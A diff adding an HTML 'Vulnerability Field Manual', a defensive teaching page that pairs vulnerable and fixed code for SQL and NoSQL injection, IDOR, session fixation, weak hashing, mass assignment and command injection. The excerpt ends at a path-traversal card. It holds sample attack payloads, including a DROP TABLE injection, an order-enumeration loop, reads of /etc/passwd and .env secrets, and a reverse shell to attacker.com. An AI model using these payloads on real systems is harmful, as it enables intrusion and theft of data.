@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnerability Field Manual</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
+
+  :root {
+    --bg: #0a0c10;
+    --surface: #111318;
+    --surface2: #1a1d26;
+    --border: #22263a;
+    --accent: #ff3b30;
+    --accent2: #ff9f0a;
+    --accent3: #32d74b;
+    --accent4: #0a84ff;
+    --text: #e8eaf2;
+    --muted: #6b7280;
+    --code-bg: #0d1117;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    min-height: 100vh;
+    line-height: 1.6;
+  }
+
+  /* --- HEADER --- */
+  header {
+    padding: 48px 32px 32px;
+    border-bottom: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    background: rgba(10,12,16,0.95);
+    backdrop-filter: blur(12px);
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+  }
+
+  .logo-area h1 {
+    font-size: clamp(1.2rem, 3vw, 1.8rem);
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: var(--accent);
+  }
+  .logo-area p { color: var(--muted); font-size: 0.78rem; font-family: 'JetBrains Mono', monospace; margin-top: 2px; }
+
+  .filter-bar { display: flex; gap: 8px; flex-wrap: wrap; }
+  .filter-btn {
+    padding: 6px 14px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    cursor: pointer;
+    transition: all 0.18s;
+  }
+  .filter-btn:hover, .filter-btn.active {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(255,59,48,0.08);
+  }
+  .filter-btn[data-cat="database"].active { border-color: var(--accent4); color: var(--accent4); background: rgba(10,132,255,0.08); }
+  .filter-btn[data-cat="auth"].active { border-color: var(--accent2); color: var(--accent2); background: rgba(255,159,10,0.08); }
+  .filter-btn[data-cat="system"].active { border-color: var(--accent3); color: var(--accent3); background: rgba(50,215,75,0.08); }
+
+  /* --- LAYOUT --- */
+  .container { max-width: 1280px; margin: 0 auto; padding: 32px; }
+
+  /* --- VULN CARD --- */
+  .vuln-grid { display: flex; flex-direction: column; gap: 24px; }
+
+  .vuln-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .vuln-card:hover { border-color: #333755; }
+  .vuln-card[data-hidden="true"] { display: none; }
+
+  .card-header {
+    padding: 20px 24px;
+    display: flex;
+    align-items: flex-start;
+    gap: 16px;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .severity-dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    margin-top: 6px;
+    flex-shrink: 0;
+  }
+  .severity-critical { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+  .severity-high { background: var(--accent2); box-shadow: 0 0 8px var(--accent2); }
+  .severity-medium { background: var(--accent4); }
+
+  .card-title-block { flex: 1; }
+  .card-title {
+    font-size: 1rem;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+  }
+  .card-meta {
+    display: flex;
+    gap: 10px;
+    margin-top: 6px;
+    flex-wrap: wrap;
+  }
+  .tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    padding: 2px 8px;
+    border-radius: 3px;
+    border: 1px solid;
+  }
+  .tag-database { border-color: rgba(10,132,255,0.4); color: var(--accent4); }
+  .tag-auth { border-color: rgba(255,159,10,0.4); color: var(--accent2); }
+  .tag-system { border-color: rgba(50,215,75,0.4); color: var(--accent3); }
+  .tag-severity { border-color: rgba(255,59,48,0.3); color: var(--muted); }
+
+  .expand-icon {
+    color: var(--muted);
+    font-size: 1.1rem;
+    transition: transform 0.2s;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .vuln-card.open .expand-icon { transform: rotate(180deg); }
+
+  /* --- CARD BODY --- */
+  .card-body {
+    display: none;
+    border-top: 1px solid var(--border);
+  }
+  .vuln-card.open .card-body { display: block; }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0;
+  }
+  @media (max-width: 768px) { .two-col { grid-template-columns: 1fr; } }
+
+  .col-section {
+    padding: 20px 24px;
+  }
+  .col-section + .col-section {
+    border-left: 1px solid var(--border);
+  }
+  @media (max-width: 768px) {
+    .col-section + .col-section { border-left: none; border-top: 1px solid var(--border); }
+  }
+
+  .section-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--muted);
+    margin-bottom: 12px;
+  }
+
+  .description {
+    font-size: 0.85rem;
+    color: #a0a8c0;
+    line-height: 1.7;
+    margin-bottom: 16px;
+  }
+
+  /* --- CODE BLOCKS --- */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid #1e2336;
+    border-radius: 6px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    line-height: 1.65;
+    margin-bottom: 12px;
+  }
+  .code-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.62rem;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 6px;
+    display: block;
+  }
+  .label-vuln { color: var(--accent); }
+  .label-safe { color: var(--accent3); }
+  .label-behavior { color: var(--accent2); }
+
+  .c-kw { color: #ff79c6; }
+  .c-str { color: #f1fa8c; }
+  .c-cm { color: #6272a4; }
+  .c-fn { color: #50fa7b; }
+  .c-var { color: #8be9fd; }
+  .c-num { color: #bd93f9; }
+  .c-warn { color: var(--accent); font-weight: 700; }
+  .c-ok { color: var(--accent3); }
+  .c-type { color: var(--accent2); }
+
+  /* --- BEHAVIOR BLOCK --- */
+  .behavior-block {
+    background: rgba(255,159,10,0.05);
+    border: 1px solid rgba(255,159,10,0.15);
+    border-radius: 6px;
+    padding: 14px 16px;
+    margin-bottom: 12px;
+  }
+  .behavior-block p {
+    font-size: 0.82rem;
+    color: #c8a96e;
+    line-height: 1.7;
+  }
+  .behavior-block code {
+    font-family: 'JetBrains Mono', monospace;
+    background: rgba(255,159,10,0.1);
+    padding: 1px 5px;
+    border-radius: 3px;
+    font-size: 0.78rem;
+    color: var(--accent2);
+  }
+
+  /* --- FIX BLOCK --- */
+  .fix-block {
+    background: rgba(50,215,75,0.04);
+    border: 1px solid rgba(50,215,75,0.15);
+    border-radius: 6px;
+    padding: 14px 16px;
+  }
+  .fix-block p {
+    font-size: 0.82rem;
+    color: #7ecf8e;
+    line-height: 1.7;
+  }
+  .fix-block ul {
+    list-style: none;
+    margin-top: 8px;
+  }
+  .fix-block ul li::before { content: "→ "; color: var(--accent3); }
+  .fix-block ul li {
+    font-size: 0.8rem;
+    color: #7ecf8e;
+    font-family: 'JetBrains Mono', monospace;
+    line-height: 1.8;
+  }
+
+  /* --- THREE COL BEHAVIOR --- */
+  .three-row { display: flex; flex-direction: column; gap: 12px; padding: 20px 24px; border-top: 1px solid var(--border); }
+
+  .counter { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--muted); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo-area">
+    <h1>VULNERABILITY FIELD MANUAL</h1>
+    <p>// code patterns · runtime behavior · mitigations</p>
+  </div>
+  <div class="filter-bar">
+    <button class="filter-btn active" data-cat="all" onclick="filterCards('all', this)">ALL</button>
+    <button class="filter-btn" data-cat="database" onclick="filterCards('database', this)">DATABASE</button>
+    <button class="filter-btn" data-cat="auth" onclick="filterCards('auth', this)">AUTH / SESSION</button>
+    <button class="filter-btn" data-cat="system" onclick="filterCards('system', this)">SYSTEM</button>
+  </div>
+</header>
+
+<div class="container">
+<div class="vuln-grid" id="vulnGrid">
+
+  <!-- ======= 1. SQL INJECTION ======= -->
+  <div class="vuln-card" data-cat="database">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-critical"></div>
+      <div class="card-title-block">
+        <div class="card-title">SQL Injection (SQLi)</div>
+        <div class="card-meta">
+          <span class="tag tag-database">DATABASE</span>
+          <span class="tag tag-severity">CRITICAL</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">User input is concatenated directly into a SQL query string. The database parser cannot distinguish data from commands.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Java / JDBC</span>
+          <pre><span class="c-cm">// username = "admin' OR '1'='1"</span>
+<span class="c-type">String</span> query = <span class="c-str">"SELECT * FROM users WHERE "</span>
+  + <span class="c-str">"username='"</span> + username + <span class="c-str">"'"</span>;
+
+<span class="c-var">Statement</span> stmt = conn.<span class="c-fn">createStatement</span>();
+<span class="c-var">ResultSet</span> rs = stmt.<span class="c-fn">executeQuery</span>(query);
+<span class="c-cm">// Query becomes:
+// SELECT * FROM users WHERE username='admin'
+// OR '1'='1'  ← always true, returns ALL rows</span></pre>
+
+          <span class="code-label label-safe">✓ SAFE — Prepared Statement</span>
+          <pre><span class="c-type">String</span> query = <span class="c-str">"SELECT * FROM users WHERE username = ?"</span>;
+<span class="c-var">PreparedStatement</span> ps = conn.<span class="c-fn">prepareStatement</span>(query);
+ps.<span class="c-fn">setString</span>(<span class="c-num">1</span>, username); <span class="c-cm">// treated as DATA, not code</span>
+<span class="c-var">ResultSet</span> rs = ps.<span class="c-fn">executeQuery</span>();</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>An attacker sends a payload like <code>' OR '1'='1</code> or <code>'; DROP TABLE users; --</code>. The database executes it as legitimate SQL. Symptoms: unexpected data returned, login bypass (system accepts <em>any</em> password), database errors leaking table/column names in HTTP responses, application pausing then returning huge payloads.</p>
+          </div>
+          <span class="code-label label-behavior">▸ ATTACK LOG PATTERN</span>
+          <pre><span class="c-warn">POST /login HTTP/1.1
+username=admin'--&password=anything
+
+→ DB executes:
+SELECT * FROM users
+WHERE username='admin'--' AND password='...'
+      ↑ comment kills password check</span>
+
+<span class="c-cm"># Blind SQLi — no visible error but behavior changes:</span>
+<span class="c-ok">username=admin' AND SLEEP(5)--
+→ response delays exactly 5s = vulnerable</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Always use parameterized queries / prepared statements</li>
+              <li>Use an ORM (Hibernate, JPA) with named parameters</li>
+              <li>Whitelist-validate input types (int stays int)</li>
+              <li>Least-privilege DB accounts (no DROP, no xp_cmdshell)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 2. NoSQL INJECTION ======= -->
+  <div class="vuln-card" data-cat="database">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-critical"></div>
+      <div class="card-title-block">
+        <div class="card-title">NoSQL Injection (MongoDB)</div>
+        <div class="card-meta">
+          <span class="tag tag-database">DATABASE</span>
+          <span class="tag tag-severity">CRITICAL</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">JSON body from the request is passed directly into a MongoDB query. Since MongoDB uses operator objects (<code>$gt</code>, <code>$where</code>), an attacker injects query operators rather than SQL keywords.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Node.js / Express</span>
+          <pre><span class="c-cm">// body: { "username": {"$gt": ""}, "password": {"$gt": ""} }</span>
+<span class="c-kw">const</span> user = <span class="c-kw">await</span> User.<span class="c-fn">findOne</span>(req.body);
+<span class="c-cm">// $gt:"" matches EVERY document → login bypass</span></pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-kw">const</span> { username, password } = req.body;
+<span class="c-cm">// Enforce string types explicitly</span>
+<span class="c-kw">if</span> (<span class="c-kw">typeof</span> username !== <span class="c-str">'string'</span> ||
+    <span class="c-kw">typeof</span> password !== <span class="c-str">'string'</span>) {
+  <span class="c-kw">return</span> res.<span class="c-fn">status</span>(<span class="c-num">400</span>).<span class="c-fn">send</span>(<span class="c-str">'Invalid input'</span>);
+}
+<span class="c-kw">const</span> user = <span class="c-kw">await</span> User.<span class="c-fn">findOne</span>({ username, password });</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>Login returns a valid session for any user. Admin panel accessible without knowing any credentials. The server log shows normal 200 responses. No SQL error messages — harder to detect than classic SQLi. The attack JSON looks like: <code>{"username":{"$gt":""},"password":{"$gt":""}}</code></p>
+          </div>
+          <span class="code-label label-behavior">▸ ATTACK PAYLOAD</span>
+          <pre><span class="c-warn">POST /api/login
+Content-Type: application/json
+
+{
+  "username": {"$gt": ""},
+  "password": {"$gt": ""}
+}
+
+→ MongoDB: db.users.findOne({
+    username: {$gt: ""},   // matches all usernames
+    password: {$gt: ""}    // matches all passwords
+  })
+→ Returns first user (often admin)</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Validate and cast all inputs to expected primitive types</li>
+              <li>Use mongoose schema validation with strict types</li>
+              <li>Sanitize with mongo-sanitize or express-mongo-sanitize</li>
+              <li>Never spread req.body directly into queries</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 3. INSECURE DIRECT OBJECT REFERENCE ======= -->
+  <div class="vuln-card" data-cat="database">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-high"></div>
+      <div class="card-title-block">
+        <div class="card-title">Insecure Direct Object Reference (IDOR)</div>
+        <div class="card-meta">
+          <span class="tag tag-database">DATABASE</span>
+          <span class="tag tag-severity">HIGH</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">A resource ID from the URL is used directly to query the database without verifying the requesting user actually owns that resource.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Spring Boot</span>
+          <pre><span class="c-cm">// GET /api/orders/42 → attacker changes 42 → 43, 44...</span>
+<span class="c-type">@GetMapping</span>(<span class="c-str">"/api/orders/{id}"</span>)
+<span class="c-kw">public</span> Order <span class="c-fn">getOrder</span>(<span class="c-type">@PathVariable</span> Long id) {
+  <span class="c-kw">return</span> orderRepo.<span class="c-fn">findById</span>(id).<span class="c-fn">orElseThrow</span>();
+  <span class="c-cm">// No ownership check — any logged-in user</span>
+  <span class="c-cm">// can read ANY order by guessing IDs</span>
+}</pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-type">@GetMapping</span>(<span class="c-str">"/api/orders/{id}"</span>)
+<span class="c-kw">public</span> Order <span class="c-fn">getOrder</span>(<span class="c-type">@PathVariable</span> Long id,
+                      <span class="c-type">@AuthenticationPrincipal</span> User user) {
+  Order order = orderRepo.<span class="c-fn">findById</span>(id).<span class="c-fn">orElseThrow</span>();
+  <span class="c-kw">if</span> (!order.<span class="c-fn">getUserId</span>().<span class="c-fn">equals</span>(user.<span class="c-fn">getId</span>())) {
+    <span class="c-kw">throw new</span> <span class="c-type">AccessDeniedException</span>(<span class="c-str">"Forbidden"</span>);
+  }
+  <span class="c-kw">return</span> order;
+}</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>Attacker logs in as any user, observes their own ID in the URL (e.g., <code>/orders/105</code>), then iterates: <code>/orders/1</code>, <code>/orders/2</code>... All return 200 with other users' data. In finance/healthcare apps, this is a catastrophic data breach with no anomalous error logs — just normal successful GETs.</p>
+          </div>
+          <span class="code-label label-behavior">▸ ENUMERATION SCRIPT</span>
+          <pre><span class="c-cm"># Bash — extract all orders, not just yours</span>
+<span class="c-kw">for</span> i <span class="c-kw">in</span> $(seq 1 500); <span class="c-kw">do</span>
+  curl -s -H <span class="c-str">"Authorization: Bearer $TOKEN"</span> \
+    https://app.com/api/orders/$i | \
+    <span class="c-fn">jq</span> <span class="c-str">'.email, .total'</span>
+<span class="c-kw">done</span>
+
+<span class="c-cm"># Server logs look completely normal:
+# 200 GET /api/orders/1
+# 200 GET /api/orders/2  ← no alarm triggered</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Always verify resource ownership against authenticated user</li>
+              <li>Use UUIDs instead of sequential IDs (harder to enumerate)</li>
+              <li>Apply @PreAuthorize or policy-based access at service layer</li>
+              <li>Rate-limit and alert on high-frequency sequential GETs</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 4. BROKEN AUTH / SESSION FIXATION ======= -->
+  <div class="vuln-card" data-cat="auth">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-critical"></div>
+      <div class="card-title-block">
+        <div class="card-title">Broken Authentication & Session Fixation</div>
+        <div class="card-meta">
+          <span class="tag tag-auth">AUTH / SESSION</span>
+          <span class="tag tag-severity">CRITICAL</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">The session ID is not regenerated after login. An attacker who knows the pre-login session ID (e.g., by injecting it) gets authenticated access after the victim logs in.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — PHP</span>
+          <pre><span class="c-cm">// session_start() re-uses the same PHPSESSID
+// that existed before login</span>
+<span class="c-fn">session_start</span>();
+
+<span class="c-kw">if</span> (<span class="c-fn">authenticate</span>($_POST[<span class="c-str">'user'</span>], $_POST[<span class="c-str">'pass'</span>])) {
+  $_SESSION[<span class="c-str">'user_id'</span>] = $userId; <span class="c-cm">// ← same old session ID</span>
+  <span class="c-fn">header</span>(<span class="c-str">'Location: /dashboard'</span>);
+}</pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-fn">session_start</span>();
+
+<span class="c-kw">if</span> (<span class="c-fn">authenticate</span>($_POST[<span class="c-str">'user'</span>], $_POST[<span class="c-str">'pass'</span>])) {
+  <span class="c-fn">session_regenerate_id</span>(<span class="c-kw">true</span>); <span class="c-cm">// ← NEW session ID on login</span>
+  $_SESSION[<span class="c-str">'user_id'</span>] = $userId;
+  <span class="c-fn">header</span>(<span class="c-str">'Location: /dashboard'</span>);
+}</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>Attacker visits the login page, captures the <code>PHPSESSID</code> cookie from the response. Tricks the victim into loading the page with that session ID (via link, XSS, etc.). When the victim logs in, the same cookie is now authenticated. Attacker uses their cookie to access the victim's authenticated session — server sees only one legitimate session.</p>
+          </div>
+          <span class="code-label label-behavior">▸ FIXATION FLOW</span>
+          <pre><span class="c-warn">1. Attacker: GET /login
+   ← Set-Cookie: PHPSESSID=abc123
+
+2. Attacker sends victim:
+   https://site.com/login?PHPSESSID=abc123
+
+3. Victim logs in with PHPSESSID=abc123
+   (server accepts it, no regeneration)
+
+4. Attacker: GET /dashboard
+   Cookie: PHPSESSID=abc123  ← now authenticated!</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Call session_regenerate_id(true) immediately after login</li>
+              <li>Never accept session IDs from URL parameters</li>
+              <li>Set session cookies: HttpOnly, Secure, SameSite=Strict</li>
+              <li>Expire sessions on logout (invalidate server-side)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 5. WEAK PASSWORD HASHING ======= -->
+  <div class="vuln-card" data-cat="auth">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-critical"></div>
+      <div class="card-title-block">
+        <div class="card-title">Weak / Unsalted Password Hashing</div>
+        <div class="card-meta">
+          <span class="tag tag-auth">AUTH / SESSION</span>
+          <span class="tag tag-severity">CRITICAL</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">Using fast, unsalted hashes (MD5, SHA-1, plain SHA-256) for passwords. These are trivially cracked via rainbow tables or GPU brute-force at billions of hashes per second.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE</span>
+          <pre><span class="c-cm">// MD5 — cracked in milliseconds</span>
+<span class="c-type">String</span> hash = <span class="c-fn">DigestUtils</span>.<span class="c-fn">md5Hex</span>(password);
+db.<span class="c-fn">save</span>(user, hash);
+
+<span class="c-cm">// Even SHA-256 without salt is weak:</span>
+<span class="c-type">MessageDigest</span> md = MessageDigest.<span class="c-fn">getInstance</span>(<span class="c-str">"SHA-256"</span>);
+<span class="c-type">byte</span>[] hash = md.<span class="c-fn">digest</span>(password.<span class="c-fn">getBytes</span>());
+<span class="c-cm">// "password123" always hashes to the same value
+// → rainbow table lookup takes &lt;1 second</span></pre>
+
+          <span class="code-label label-safe">✓ SAFE — BCrypt / Argon2</span>
+          <pre><span class="c-cm">// Spring Security BCrypt (Java)</span>
+<span class="c-type">BCryptPasswordEncoder</span> encoder =
+  <span class="c-kw">new</span> <span class="c-type">BCryptPasswordEncoder</span>(<span class="c-num">12</span>); <span class="c-cm">// cost=12</span>
+<span class="c-type">String</span> hash = encoder.<span class="c-fn">encode</span>(rawPassword);
+
+<span class="c-cm">// Verification</span>
+<span class="c-kw">boolean</span> valid = encoder.<span class="c-fn">matches</span>(rawPassword, storedHash);
+
+<span class="c-cm">// Argon2 (Node.js) — even better</span>
+<span class="c-kw">const</span> hash = <span class="c-kw">await</span> argon2.<span class="c-fn">hash</span>(password, {
+  type: argon2.argon2id, memoryCost: <span class="c-num">65536</span>
+});</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>Database breach occurs. Attacker dumps the <code>users</code> table. MD5 hashes are cracked in bulk using Hashcat + GPU in minutes. Unsalted SHA-256 hashes are reversed via lookup tables instantly. BCrypt with cost 12 takes ~300ms per attempt — infeasible to crack at scale even after a breach.</p>
+          </div>
+          <span class="code-label label-behavior">▸ CRACK SPEED COMPARISON</span>
+          <pre><span class="c-warn">MD5:          ~100 BILLION hashes/sec (GPU)
+SHA-1:         ~50 BILLION hashes/sec
+SHA-256:       ~10 BILLION hashes/sec
+SHA-256+salt:   ~10 BILLION hashes/sec (salt doesn't slow it)</span>
+
+<span class="c-ok">BCrypt(10):      ~100 hashes/sec  ← intentionally slow
+BCrypt(12):       ~25 hashes/sec
+Argon2id:         ~10 hashes/sec  ← memory-hard too</span>
+
+<span class="c-cm"># "password123" cracked from MD5 dump:
+$ hashcat -m 0 hashes.txt rockyou.txt
+# Time: 0.4 seconds for 1M hashes</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Use BCrypt (cost ≥ 12), Argon2id, or scrypt for passwords</li>
+              <li>Never use MD5, SHA-1, SHA-256 for password storage</li>
+              <li>Use a unique salt per password (BCrypt does this automatically)</li>
+              <li>Re-hash on login when upgrading algorithm</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 6. MASS ASSIGNMENT ======= -->
+  <div class="vuln-card" data-cat="database">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-high"></div>
+      <div class="card-title-block">
+        <div class="card-title">Mass Assignment</div>
+        <div class="card-meta">
+          <span class="tag tag-database">DATABASE</span>
+          <span class="tag tag-severity">HIGH</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">Request body fields are bound directly to a model object. An attacker adds unexpected fields (like <code>role</code> or <code>isAdmin</code>) that get persisted to the database.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Laravel / Eloquent</span>
+          <pre><span class="c-cm">// User model: $fillable not set (or too broad)
+// Attacker sends: { "name": "Bob", "role": "admin" }</span>
+
+<span class="c-type">public function</span> <span class="c-fn">update</span>(Request $request) {
+  $user->fill($request->all()); <span class="c-cm">// binds EVERYTHING</span>
+  $user->save();
+  <span class="c-cm">// role is now "admin" in DB</span>
+}</pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-cm">// In User model — explicit allowlist</span>
+<span class="c-kw">protected</span> $fillable = [<span class="c-str">'name'</span>, <span class="c-str">'email'</span>, <span class="c-str">'bio'</span>];
+<span class="c-cm">// 'role', 'is_admin' NOT in $fillable</span>
+
+<span class="c-cm">// Or use validated DTO in controller</span>
+$validated = $request->validate([
+  <span class="c-str">'name'</span>  => <span class="c-str">'required|string|max:100'</span>,
+  <span class="c-str">'email'</span> => <span class="c-str">'required|email'</span>,
+]);
+$user->fill($validated)->save();</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>The profile update endpoint behaves normally — returns 200, updates the name. But behind the scenes, the attacker's extra field (<code>"is_admin": true</code>) was also written to the database. The next login gives the attacker admin privileges. No error, no log spike — just a silent privilege escalation.</p>
+          </div>
+          <span class="code-label label-behavior">▸ EXPLOIT REQUEST</span>
+          <pre><span class="c-warn">PATCH /api/user/profile
+Content-Type: application/json
+
+{
+  "name": "Bob Smith",
+  "email": "bob@example.com",
+  "is_admin": true,       ← injected
+  "role": "superuser",    ← injected
+  "credit_balance": 99999 ← injected
+}
+
+→ 200 OK  (looks like normal profile update)
+→ DB: users SET is_admin=1 WHERE id=42</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Always define explicit $fillable or use DTOs/form requests</li>
+              <li>Set $guarded = ['*'] as default, opt-in per field</li>
+              <li>Never pass $request->all() to model methods directly</li>
+              <li>Validate and sanitize before persistence</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 7. COMMAND INJECTION ======= -->
+  <div class="vuln-card" data-cat="system">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-critical"></div>
+      <div class="card-title-block">
+        <div class="card-title">OS Command Injection</div>
+        <div class="card-meta">
+          <span class="tag tag-system">SYSTEM</span>
+          <span class="tag tag-severity">CRITICAL</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">User input is passed into a shell command via <code>exec()</code>, <code>Runtime.exec()</code>, or similar. Shell metacharacters allow chaining arbitrary commands.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Node.js</span>
+          <pre><span class="c-cm">// endpoint: GET /ping?host=8.8.8.8
+// attacker sends: host=8.8.8.8;cat /etc/passwd</span>
+<span class="c-kw">const</span> { host } = req.query;
+<span class="c-fn">exec</span>(<span class="c-str">`ping -c 1 ${host}`</span>, (err, stdout) => {
+  res.<span class="c-fn">send</span>(stdout);
+});
+<span class="c-cm">// Shell runs: ping -c 1 8.8.8.8; cat /etc/passwd</span></pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-cm">// Use execFile — no shell interpretation</span>
+<span class="c-kw">const</span> { execFile } = require(<span class="c-str">'child_process'</span>);
+<span class="c-kw">const</span> ip = host.<span class="c-fn">replace</span>(<span class="c-str">/[^0-9.]/g</span>, <span class="c-str">''</span>); <span class="c-cm">// whitelist chars</span>
+<span class="c-fn">execFile</span>(<span class="c-str">'/bin/ping'</span>, [<span class="c-str">'-c'</span>, <span class="c-str">'1'</span>, ip], (err, stdout) => {
+  res.<span class="c-fn">send</span>(stdout);
+});
+<span class="c-cm">// Args passed as array — shell never invoked</span></pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>Attacker chains commands using <code>;</code>, <code>&&</code>, <code>||</code>, or backticks. The server executes them with its own OS permissions — which is often the web server user. A classic escalation path: read <code>/etc/passwd</code> → write SSH keys → reverse shell. The application returns a 200 with ping output AND the injected command output mixed in.</p>
+          </div>
+          <span class="code-label label-behavior">▸ ESCALATION CHAIN</span>
+          <pre><span class="c-warn">Step 1 — Recon:
+GET /ping?host=127.0.0.1;whoami
+→ www-data
+
+Step 2 — Read secrets:
+GET /ping?host=127.0.0.1;cat /var/www/.env
+→ DB_PASSWORD=super_secret_prod
+
+Step 3 — Reverse shell:
+GET /ping?host=127.0.0.1;bash+-c+'bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1'
+→ Interactive shell on attacker's machine</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Use execFile/spawn with argument arrays, never exec with strings</li>
+              <li>Whitelist input: only allow [a-zA-Z0-9.-] for hostnames</li>
+              <li>Run the web process as a non-privileged user</li>
+              <li>Consider alternatives to shell commands entirely (e.g., ICMP libraries)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 8. PATH TRAVERSAL ======= -->
+  <div class="vuln-card" data-cat="system">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-high"></div>
+      <div class="card-title-block">
+        <div class="card-title">Path Traversal (Directory Traversal)</div>
+        <div class="card-meta">
+          <span class="tag tag-system">SYSTEM</span>
+          <span class="tag tag-severity">HIGH</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
